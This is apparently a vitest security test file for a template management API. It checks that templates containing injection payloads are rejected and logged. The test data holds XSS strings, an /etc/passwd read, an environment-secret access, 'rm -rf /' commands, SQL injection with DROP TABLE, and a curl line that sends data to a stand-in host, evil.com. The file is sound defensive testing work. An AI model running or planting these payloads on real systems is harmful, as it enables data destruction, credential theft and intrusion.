/**
 * Security Validation Tests for Template System
 * Comprehensive security testing including penetration testing scenarios
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { app } from '../index.js';
import { 
  initializeSystemPromptManager,
  initializeTemplateValidationService 
} from '../services/system-prompt-manager.js';

describe('Template Security Validation Tests', () => {
  let authToken: string;
  let adminToken: string;

  beforeAll(async () => {
    // Initialize services
    try {
      initializeSystemPromptManager();
      initializeTemplateValidationService();
    } catch (error) {
      console.log('Template services initialization skipped in test environment');
    }

    // Get regular user token
    const userResponse = await request(app)
      .post('/api/auth/login')
      .send({
        email: 'template-e2e@test.com',
        password: 'TestPassword123!'
      });
    
    authToken = userResponse.body.token;

    // Create admin user for admin-specific tests
    const adminRegResponse = await request(app)
      .post('/api/auth/register')
      .send({
        username: 'template-admin',
        email: 'template-admin@test.com',
        password: 'AdminPassword123!',
        role: 'admin'
      });

    if (adminRegResponse.status === 201) {
      adminToken = adminRegResponse.body.token;
    } else {
      // Admin might already exist, try login
      const adminLoginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'template-admin@test.com',
          password: 'AdminPassword123!'
        });
      adminToken = adminLoginResponse.body.token;
    }
  });

  describe('Input Validation Security', () => {
    it('should reject templates with script injection attempts', async () => {
      const maliciousTemplates = [
        {
          name: 'XSS Script Tag Test',
          content: 'Hello {{name}}, <script>alert("xss")</script>',
          expectedViolation: 'SCRIPT_INJECTION'
        },
        {
          name: 'JavaScript Protocol Test',
          content: 'Click <a href="javascript:alert(1)">here</a>',
          expectedViolation: 'SCRIPT_INJECTION'
        },
        {
          name: 'Event Handler Test',
          content: '<div onclick="alert(1)">{{content}}</div>',
          expectedViolation: 'SCRIPT_INJECTION'
        },
        {
          name: 'SVG Script Test',
          content: '<svg onload="alert(1)">{{content}}</svg>',
          expectedViolation: 'SCRIPT_INJECTION'
        }
      ];

      for (const testCase of maliciousTemplates) {
        const template = {
          category: 'custom',
          key: `security_test_${Date.now()}`,
          name: testCase.name,
          description: 'Security test template',
          content: testCase.content,
          variables: [
            { name: 'name', type: 'string', required: true },
            { name: 'content', type: 'string', required: false }
          ]
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.error).toContain('security');
        expect(response.body.violations).toBeDefined();
        expect(response.body.violations.some((v: any) => 
          v.type === testCase.expectedViolation
        )).toBe(true);
      }
    });

    it('should reject templates with code injection attempts', async () => {
      const codeInjectionTemplates = [
        {
          name: 'Eval Injection Test',
          content: 'Hello {{name}}, eval("malicious code")',
          expectedViolation: 'CODE_INJECTION'
        },
        {
          name: 'Function Constructor Test',
          content: 'Hello {{name}}, Function("return process")()',
          expectedViolation: 'CODE_INJECTION'
        },
        {
          name: 'Require Injection Test',
          content: 'Hello {{name}}, require("fs").readFileSync("/etc/passwd")',
          expectedViolation: 'CODE_INJECTION'
        },
        {
          name: 'Process Access Test',
          content: 'Hello {{name}}, process.env.SECRET_KEY',
          expectedViolation: 'CODE_INJECTION'
        }
      ];

      for (const testCase of codeInjectionTemplates) {
        const template = {
          category: 'custom',
          key: `code_injection_${Date.now()}`,
          name: testCase.name,
          description: 'Code injection test template',
          content: testCase.content,
          variables: [{ name: 'name', type: 'string', required: true }]
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.violations.some((v: any) => 
          v.type === testCase.expectedViolation
        )).toBe(true);
      }
    });

    it('should reject templates with command injection attempts', async () => {
      const commandInjectionTemplates = [
        {
          name: 'Command Substitution Test',
          content: 'Hello {{name}}, $(rm -rf /)',
          expectedViolation: 'COMMAND_INJECTION'
        },
        {
          name: 'Pipe Command Test',
          content: 'Hello {{name}} | curl http://evil.com/steal',
          expectedViolation: 'COMMAND_INJECTION'
        },
        {
          name: 'Semicolon Command Test',
          content: 'Hello {{name}}; rm -rf /important/data',
          expectedViolation: 'COMMAND_INJECTION'
        }
      ];

      for (const testCase of commandInjectionTemplates) {
        const template = {
          category: 'custom',
          key: `cmd_injection_${Date.now()}`,
          name: testCase.name,
          description: 'Command injection test template',
          content: testCase.content,
          variables: [{ name: 'name', type: 'string', required: true }]
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.violations.some((v: any) => 
          v.type === testCase.expectedViolation
        )).toBe(true);
      }
    });

    it('should reject templates with SQL injection patterns', async () => {
      const sqlInjectionTemplates = [
        {
          name: 'OR Injection Test',
          content: "Hello {{name}} WHERE id = '1' OR '1'='1'",
          expectedViolation: 'SQL_INJECTION'
        },
        {
          name: 'UNION SELECT Test',
          content: 'Hello {{name}} UNION SELECT password FROM users',
          expectedViolation: 'SQL_INJECTION'
        },
        {
          name: 'DROP TABLE Test',
          content: 'Hello {{name}}; DROP TABLE users;',
          expectedViolation: 'SQL_INJECTION'
        }
      ];

      for (const testCase of sqlInjectionTemplates) {
        const template = {
          category: 'custom',
          key: `sql_injection_${Date.now()}`,
          name: testCase.name,
          description: 'SQL injection test template',
          content: testCase.content,
          variables: [{ name: 'name', type: 'string', required: true }]
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.violations.some((v: any) => 
          v.type === testCase.expectedViolation
        )).toBe(true);
      }
    });

    it('should reject templates with sensitive data exposure', async () => {
      const sensitiveDataTemplates = [
        {
          name: 'Hardcoded Password Test',
          content: 'Hello {{name}}, password: "secret123"',
          expectedViolation: 'SENSITIVE_DATA_EXPOSURE'
        },
        {
          name: 'API Key Test',
          content: 'Hello {{name}}, api_key: "sk-1234567890abcdef"',
          expectedViolation: 'SENSITIVE_DATA_EXPOSURE'
        },
        {
          name: 'Credit Card Test',
          content: 'Hello {{name}}, card: 4111-1111-1111-1111',
          expectedViolation: 'SENSITIVE_DATA_EXPOSURE'
        },
        {
          name: 'SSN Test',
          content: 'Hello {{name}}, SSN: 123-45-6789',
          expectedViolation: 'SENSITIVE_DATA_EXPOSURE'
        }
      ];

      for (const testCase of sensitiveDataTemplates) {
        const template = {
          category: 'custom',
          key: `sensitive_data_${Date.now()}`,
          name: testCase.name,
          description: 'Sensitive data test template',
          content: testCase.content,
          variables: [{ name: 'name', type: 'string', required: true }]
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.violations.some((v: any) => 
          v.type === testCase.expectedViolation
        )).toBe(true);
      }
    });
  });

  describe('Variable Security Validation', () => {
    it('should reject dangerous variable names', async () => {
      const dangerousVariables = [
        'constructor',
        '__proto__',
        'prototype',
        'eval',
        'Function',
        'require',
        'process',
        'global',
        'window'
      ];

      for (const varName of dangerousVariables) {
        const template = {
          category: 'custom',
          key: `dangerous_var_${Date.now()}`,
          name: 'Dangerous Variable Test',
          description: 'Test template with dangerous variable names',
          content: `Hello {{${varName}}}`,
          variables: [
            { name: varName, type: 'string', required: true }
          ]
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.violations.some((v: any) => 
          v.type === 'UNSAFE_VARIABLE'
        )).toBe(true);
      }
    });

    it('should reject templates with excessive variable count', async () => {
      const excessiveVariables = Array.from({ length: 150 }, (_, i) => ({
        name: `var${i}`,
        type: 'string',
        required: false
      }));

      const template = {
        category: 'custom',
        key: `excessive_vars_${Date.now()}`,
        name: 'Excessive Variables Test',
        description: 'Template with too many variables',
        content: 'Hello {{var1}}',
        variables: excessiveVariables
      };

      const response = await request(app)
        .post('/api/admin/templates')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(template)
        .expect(400);

      expect(response.body.violations.some((v: any) => 
        v.type === 'EXCESSIVE_COMPLEXITY'
      )).toBe(true);
    });

    it('should validate variable types and constraints', async () => {
      const invalidVariableTemplates = [
        {
          name: 'Invalid Variable Type',
          variables: [{ name: 'test', type: 'invalid_type', required: true }],
          expectedError: 'Invalid variable type'
        },
        {
          name: 'Missing Required Fields',
          variables: [{ type: 'string', required: true }], // Missing name
          expectedError: 'Variable name is required'
        }
      ];

      for (const testCase of invalidVariableTemplates) {
        const template = {
          category: 'custom',
          key: `invalid_var_${Date.now()}`,
          name: testCase.name,
          description: 'Invalid variable test template',
          content: 'Hello {{test}}',
          variables: testCase.variables
        };

        const response = await request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
          .expect(400);

        expect(response.body.error).toBeDefined();
      }
    });
  });

  describe('Access Control Security', () => {
    it('should require authentication for template management', async () => {
      const template = {
        category: 'custom',
        key: 'auth_test',
        name: 'Authentication Test',
        description: 'Test template for authentication',
        content: 'Hello {{name}}',
        variables: [{ name: 'name', type: 'string', required: true }]
      };

      // Request without authentication should fail
      await request(app)
        .post('/api/admin/templates')
        .send(template)
        .expect(401);

      // Request with invalid token should fail
      await request(app)
        .post('/api/admin/templates')
        .set('Authorization', 'Bearer invalid-token')
        .send(template)
        .expect(401);
    });

    it('should require admin privileges for template management', async () => {
      const template = {
        category: 'custom',
        key: 'admin_test',
        name: 'Admin Test',
        description: 'Test template for admin access',
        content: 'Hello {{name}}',
        variables: [{ name: 'name', type: 'string', required: true }]
      };

      // Regular user should not be able to create templates
      const response = await request(app)
        .post('/api/admin/templates')
        .set('Authorization', `Bearer ${authToken}`)
        .send(template);

      // Should either be forbidden (403) or require admin role
      expect([403, 401]).toContain(response.status);
    });

    it('should log security violations for audit purposes', async () => {
      const maliciousTemplate = {
        category: 'custom',
        key: `audit_test_${Date.now()}`,
        name: 'Audit Test',
        description: 'Template for audit testing',
        content: 'Hello {{name}}, <script>alert("audit test")</script>',
        variables: [{ name: 'name', type: 'string', required: true }]
      };

      // Attempt to create malicious template
      await request(app)
        .post('/api/admin/templates')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(maliciousTemplate)
        .expect(400);

      // Check that security violation was logged
      const alertsResponse = await request(app)
        .get('/api/admin/security/alerts')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      expect(alertsResponse.body.alerts.length).toBeGreaterThan(0);
      expect(alertsResponse.body.alerts.some((alert: any) => 
        alert.type === 'TEMPLATE_INJECTION_ATTEMPT'
      )).toBe(true);
    });
  });

  describe('Content Sanitization', () => {
    it('should sanitize template content when possible', async () => {
      // Test if the system can sanitize and suggest fixes
      const sanitizableTemplate = {
        category: 'custom',
        key: `sanitize_test_${Date.now()}`,
        name: 'Sanitization Test',
        description: 'Template for sanitization testing',
        content: 'Hello {{name}}, <b>bold text</b> and <i>italic text</i>',
        variables: [{ name: 'name', type: 'string', required: true }]
      };

      const response = await request(app)
        .post('/api/admin/templates/validate')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(sanitizableTemplate);

      // Should provide sanitization suggestions
      expect(response.body.suggestions).toBeDefined();
      if (response.body.sanitizedContent) {
        expect(response.body.sanitizedContent).not.toContain('<script>');
      }
    });

    it('should provide security recommendations', async () => {
      const template = {
        category: 'custom',
        key: `recommendations_test_${Date.now()}`,
        name: 'Recommendations Test',
        description: 'Template for security recommendations',
        content: 'Hello {{user_input}}, process this: {{raw_data}}',
        variables: [
          { name: 'user_input', type: 'string', required: true },
          { name: 'raw_data', type: 'string', required: true }
        ]
      };

      const response = await request(app)
        .post('/api/admin/templates/validate')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(template);

      expect(response.body.recommendations).toBeDefined();
      expect(Array.isArray(response.body.recommendations)).toBe(true);
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    it('should enforce rate limits on template operations', async () => {
      const template = {
        category: 'custom',
        key: `rate_limit_test_${Date.now()}`,
        name: 'Rate Limit Test',
        description: 'Template for rate limiting test',
        content: 'Hello {{name}}',
        variables: [{ name: 'name', type: 'string', required: true }]
      };

      // Make rapid requests to test rate limiting
      const rapidRequests = Array.from({ length: 20 }, () =>
        request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            ...template,
            key: `rate_limit_${Date.now()}_${Math.random()}`
          })
      );

      const responses = await Promise.allSettled(rapidRequests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(result => 
        result.status === 'fulfilled' && 
        (result.value as any).status === 429
      );

      // If rate limiting is implemented, we should see some 429 responses
      // If not implemented yet, all should succeed (this test documents expected behavior)
      console.log(`Rate limited responses: ${rateLimitedResponses.length}/20`);
    });

    it('should detect and prevent template spam', async () => {
      // Create multiple similar templates rapidly
      const spamTemplates = Array.from({ length: 10 }, (_, i) => ({
        category: 'custom',
        key: `spam_test_${i}_${Date.now()}`,
        name: `Spam Template ${i}`,
        description: 'Spam template for testing',
        content: `Spam content ${i}: {{name}}`,
        variables: [{ name: 'name', type: 'string', required: true }]
      }));

      const spamRequests = spamTemplates.map(template =>
        request(app)
          .post('/api/admin/templates')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(template)
      );

      const responses = await Promise.allSettled(spamRequests);
      
      // System should handle spam detection gracefully
      const successfulResponses = responses.filter(result => 
        result.status === 'fulfilled' && 
        (result.value as any).status === 201
      );

      // All should succeed if no spam detection, or some should be blocked
      console.log(`Successful spam requests: ${successfulResponses.length}/10`);
    });
  });

  describe('Template Execution Security', () => {
    it('should prevent template execution in unsafe contexts', async () => {
      // Create a safe template first
      const safeTemplate = {
        category: 'custom',
        key: `execution_test_${Date.now()}`,
        name: 'Execution Security Test',
        description: 'Template for execution security testing',
        content: 'Process {{user_input}} safely',
        variables: [{ name: 'user_input', type: 'string', required: true }]
      };

      const createResponse = await request(app)
        .post('/api/admin/templates')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(safeTemplate)
        .expect(201);

      const templateId = createResponse.body.id;

      // Test with malicious variable values
      const maliciousVariables = {
        user_input: '<script>alert("xss in variable")</script>'
      };

      const testResponse = await request(app)
        .post(`/api/admin/templates/${templateId}/test`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          variables: maliciousVariables,
          provider: 'openai'
        });

      // Should either sanitize the output or reject the request
      if (testResponse.status === 200) {
        expect(testResponse.body.renderedContent).not.toContain('<script>');
      } else {
        expect(testResponse.status).toBe(400);
        expect(testResponse.body.error).toContain('security');
      }
    });

    it('should validate template rendering context', async () => {
      // Test template rendering with various contexts
      const contextTests = [
        {
          name: 'Admin Context',
          context: { role: 'admin', permissions: ['all'] },
          shouldSucceed: true
        },
        {
          name: 'User Context',
          context: { role: 'user', permissions: ['read'] },
          shouldSucceed: true
        },
        {
          name: 'Invalid Context',
          context: { role: 'invalid', permissions: [] },
          shouldSucceed: false
        }
      ];

      // This test documents expected behavior for context validation
      // Implementation may vary based on security requirements
      for (const test of contextTests) {
        console.log(`Testing context: ${test.name}`);
        // Context validation would be implemented in the template rendering service
      }
    });
  });

  describe('Security Monitoring and Alerting', () => {
    it('should generate security alerts for suspicious activity', async () => {
      // Perform suspicious activities
      const suspiciousActivities = [
        {
          action: 'Multiple failed template creations',
          template: {
            category: 'custom',
            key: `suspicious_${Date.now()}`,
            name: 'Suspicious Template',
            content: 'eval("suspicious") {{name}}',
            variables: [{ name: 'name', type: 'string', required: true }]
          }
        }
      ];

      for (const activity of suspiciousActivities) {
        // Attempt multiple times to trigger alerts
        for (let i = 0; i < 3; i++) {
          await request(app)
            .post('/api/admin/templates')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
              ...activity.template,
              key: `${activity.template.key}_${i}`
            })
            .expect(400);
        }
      }

      // Check for security alerts
      const alertsResponse = await request(app)
        .get('/api/admin/security/alerts')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      expect(alertsResponse.body.alerts.length).toBeGreaterThan(0);
    });

    it('should provide security statistics and metrics', async () => {
      const statsResponse = await request(app)
        .get('/api/admin/security/statistics')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      expect(statsResponse.body.totalAlerts).toBeDefined();
      expect(statsResponse.body.alertsBySeverity).toBeDefined();
      expect(statsResponse.body.alertsByType).toBeDefined();
      expect(statsResponse.body.topViolatingUsers).toBeDefined();
    });
  });
});